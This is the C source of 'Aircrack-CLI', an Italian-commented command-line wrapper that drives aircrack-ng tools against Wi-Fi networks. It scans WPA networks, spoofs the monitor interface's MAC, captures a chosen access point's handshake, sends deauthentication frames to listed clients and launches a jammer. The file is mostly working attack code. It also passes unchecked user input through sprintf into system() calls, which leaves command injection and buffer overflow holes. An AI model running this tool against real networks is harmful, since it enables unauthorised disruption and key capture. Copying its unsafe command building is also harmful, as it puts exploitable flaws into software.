/**
        Aircrack - Command Line Interface

        Interfaccia principale
        main.c
**/

#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>

//general library header
#include "lib.h"
//header installatore
#include "install.h"

#define MACLEN 17
#define MACLST 100
#define STDWLAN " wlan0 "    //LASCIARE gli spazi prima e dopo il nome interfaccia!
#define NETWSTOP "service network-manager stop"
#define NETWSTART "service network-manager start"
#define CLEAR "clear"

#define VERS "beta-03"    //codice versione  -  TENERE AGGIORNATO!
//#define DEBUG

//prototipi
void printHeader();
void printSyntax(char*);
void installer();
char **deauthClient(char *, char *, char **, int *);
int jammer(char *, char *, char **, int);
void stopMonitor(char*, char*, FILE*);
void netwCheck(char);
int checkExit(char c, char *, char *, char *, FILE *);



int main(int argc, char *argv[])
{
    //variabili generali
    int opz, inst=TRUE, listdim;
    FILE *fpid;

    //stringhe programma
    char c, can[5], bssid[20], **maclist=NULL, fout[BUFF], inmon[]={"mon0"}, pidpath[]={"/tmp/aircli-pid-0"},
         startmon[30]={"airmon-ng start"}, stopmon[25]={"airmon-ng stop "},
         montmp[BUFF]={"xterm -T MonitorTemp -e airodump-ng --encrypt wpa"},
		 scanmon[BUFF*2]={"xterm -T MonitorHandshake -e airodump-ng --bssid"};


    //stampa messaggio iniziale
    printHeader();

    //imposto nome interfaccia di rete e altri parametri
    if (argc >= 2) {
        if (!strcmp(argv[1],"N") || !strcmp(argv[1],"n")) {     //esclusione da parametro dell'installatore
            inst = FALSE;
            if (argc == 3)
                sprintf(startmon, "%s %s ", startmon, argv[2]);
            else
                strcat(startmon, STDWLAN);
        }
        else
            sprintf(startmon, "%s %s ", startmon, argv[1]);
    }
    else {    //interfaccia standard
        strcat(startmon, STDWLAN);	
		printSyntax(argv[0]);
    }

    //controllo diritti esecuzione
    if (getgid() != 0) {
        printf("Eseguire il programma con diritti di amministratore!\n\n");
		return FAIL;
    }

    //se non escluso eseguo parte installazioni
    if (inst == TRUE)
        installer();

    c = '0';
    // arresto processi potenzialmente nocivi
    printf("\nVuoi terminare \"network-manager\"? [S-N]\n");
    while (c != 'S' && c != 'N') {
        scanf("%c", &c);
        c = toupper(c);
    }
    if (c == 'S')
        system(NETWSTOP);


    /** FASE 1 **/

    printf("\n\n === Avvio interfaccia monitor temporanea ===\n");
    system(startmon);

    //gestione PID file
    fpid = pidOpen(inmon, pidpath);

    //cambio MAC del monitor (uso di macchanger)
    macchanger(inmon);

    //imposto stop monitor
    strcat(stopmon, inmon);

    //scanner delle reti in un terminale separato
    sprintf(montmp, "%s %s &", montmp, inmon);
    system(montmp);

    //aquisizione dati
    printf("\nNumero di canale (-1 per clean-exit):\t");
    scanf("%s", can);
    checkExit(c, can, stopmon, pidpath, fpid);

    printf("Identificativo BSSID:\t");
    scanf("%s", bssid);

    #ifdef DEBUG
    printf("---bssid: %s, canale: %s\n", bssid, can);
    #endif

    //chiusura scanner e monitor
    system(stopmon);
    sleep(1);

    #ifndef DEBUG
    system(CLEAR);
    #endif


    /** FASE 2 **/

    printf("\n === Avvio interfaccia monitor ===\n");
    strcat(startmon, can);

    #ifdef DEBUG
    printf("---stringa con canale: %s\n", startmon);
    #endif

    //avvio monitor
    system(startmon);

    //cambio MAC del monitor (uso di macchanger)
    macchanger(inmon);

    //file output
    printf("\nFile di output (NO spazi!, -1 to clean-exit):\t");
    scanf("%s", fout);
    checkExit(c, fout, stopmon, pidpath, fpid);

    #ifdef DEBUG
    printf("---nome file: %s\n", fout);
    #endif

    //costruisco stringa
    sprintf(scanmon, "%s %s -c %s -w %s %s --ignore-negative-one &", scanmon, bssid, can, fout, inmon);

    #ifdef DEBUG
    printf("---stringa completa: %s\n", scanmon);
    #endif

    //scanner handshake
    system(scanmon);

    //scelta azione
    do {
        printf("\n\nCosa vuoi fare?\n===============\n\t1. De-autentica client\n\t2. Jammer\n\t0. Termina la scansione\n");
        scanf("%d", &opz);
        switch (opz) {
            case 1:
				maclist = deauthClient(bssid, inmon, maclist, &listdim);
                break;
		    case 2:
				jammer(bssid, inmon, maclist, listdim);
				break;
            case 0:
                break;
            default:
                printf("\nErrore: opzione non prevista!\n");
        }
    } while (opz != 0);

    //chiusura monitor, controllo network-manager e free memoria
    stopMonitor(stopmon, pidpath, fpid);
    netwCheck(c);
	freeMem(maclist, listdim);

    //saluti
    printf("Terminato. Dati scritti nel file \"%s\"\n", fout);
    printf("Premere un tasto per uscire.\n");

    getchar();
    getchar();

    return SUCCESS;
}


/* stampa intestazione */
void printHeader()
{
    printf("\n ===========================================================\n");
    printf("    Aircrack-CLI  |  Command Line Interface - v. %s\n", VERS);
    printf(" ===========================================================\n\n");
}


/* stampa sintassi comando */
void printSyntax(char *name)
{
    char id;

    //stampa condizionale all'OS
    id = checkDistro();
    printf("Sintassi: ");	
    if (id == 'u')
      printf("sudo ");
    else if (id == 'y')
      printf("su -c ");
    printf("%s [N] [WLAN-IF]\n", name);
    printf("Parametri opzionali:\n\t[N] salta installazioni\n\t[WLAN-IF] specifica l'interfaccia wireless (predefinita \"%s\")\n\n", STDWLAN);
}


/* gestore installazione */
void installer()
{
    char c;

    //dipendenze
    printf("Installare le dipendenze necessarie al programma?  [S-N]\n");
    while (c != 'S' && c != 'N') {
        scanf("%c", &c);
        c = toupper(c);
    }
    if (c == 'S')
        if (dep_install())
            printf("Attenzione: senza tutte le dipendenze il programma potrebbe non funzionare correttamente!\n\n");
    c = '0';


    //aircrack-ng
    printf("\nScaricare e installare \"Aircrack-ng\"?  [S-N]\n");
    while (c != 'S' && c != 'N') {
        scanf("%c", &c);
        c = toupper(c);
    }
    if (c == 'S')
        if (akng_install())
            printf("Attenzione: Aircrack-ng NON installato!\n\n");
}


/* deautenticazione lista di client */
char **deauthClient(char *bssid, char *inmon, char **maclist, int *dim)
{
	char death[]={"aireplay-ng --deauth 1 -a"}, cmd[BUFF];
	int i;

	//se lista ancora vuota la inizializzo
	if (maclist == NULL) {
		maclist = (char**)malloc(MACLST * sizeof(char*));
		if (maclist == NULL) {
			printf("Errore allocazione lista MAC, dim. %d (1).\n", MACLST);
			return NULL;
		}
		*dim = 0;
		maclist = getList(maclist, dim);
		//se dim=0 errore in prima allocazione o inserimento interrotto
		if (*dim == 0) {
			free(maclist);
			maclist = NULL;
		}
	}
	else {
		printf("\nContenuto lista MAC attuale:\n");
		for (i=0; i<*dim; i++) {
			printf("\t%s", maclist[i]);
			if (i%2 == 0 && i != 0)
				printf("\n");
		}
		printf("\n");	
		printf("Scegli un'azione:\n\t1. Esegui deautenticazione\n\t2. Aggiungi indirizzi MAC\n");
		scanf("%d", &i);
		switch (i) {
		    case 1:
				break;				
		   case 2:
			   maclist = getList(maclist, dim);    //acquisizione nuovi indirizzi
			   break;
		   default:			
			   printf("\nErrore: opzione non prevista! Uso lista attuale.\n");
		}	   
	}
	printf("\n");
	for (i=0; i<*dim; i++) {
		sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, bssid, maclist[i], inmon);
		printf("\tDeAuth n.%d:\n", i+1);
		system(cmd);
	}
	return maclist;
}


/* Interface to AirJammer */
int jammer(char *bssid, char *inmon, char **maclist, int dim)
{
	char cmd[BUFF], path[BUFF], list[]={"/tmp/maclist.txt"};
	FILE *fp;
	int i;

	if (maclist == NULL) {
		fprintf(stdout, "\nError: MAC list is still empty!\n");
		return FAIL;
	}
	if ((fp = fopen(list, "w")) == NULL) {
		fprintf(stderr, "\nError writing MAC list file \"%s\".\n", list);
		return FAIL;
	}
	for (i=0; i<dim; i++)
		fprintf(fp, "%s\n", maclist[i]);
	fclose(fp);
	
	if (getcwd(path, BUFF) == NULL) {
        fprintf(stderr, "\nError reading current path.\n");
        return FAIL;
    }
	sprintf(cmd, "xterm -T AirJammer -e %s/bin/airjammer.bin %s %s %s &", path, bssid, inmon, list);

	printf("Running: %s\n", cmd);
	system(cmd);

	return SUCCESS;
}


/* gestione stop interfaccie monitor */
void stopMonitor(char *stopmon, char *pidpath, FILE *fpid)
{
    char clean[25]={"rm -f "};

    system(stopmon);
    //rimuovo file PID
    fclose(fpid);
    strcat(clean, pidpath);
    system(clean);
}


/* restart network-manager if stopped */
void netwCheck(char c)
{
    if (c == 'S') {
      printf("\nRiattivo \"network-manager\"\n");
      system(NETWSTART);
      printf("\n");
    }
}


/* check wheter to clean-exit when given "-1" string */
int checkExit(char c, char *string, char *stopmon, char *pidpath, FILE *fpid)
{
    if (!strcmp(string, "-1")) {
        netwCheck(c);
        printf("Uscita...\n");
        stopMonitor(stopmon, pidpath, fpid);
        exit(FAIL);
    }
    return SUCCESS;
}
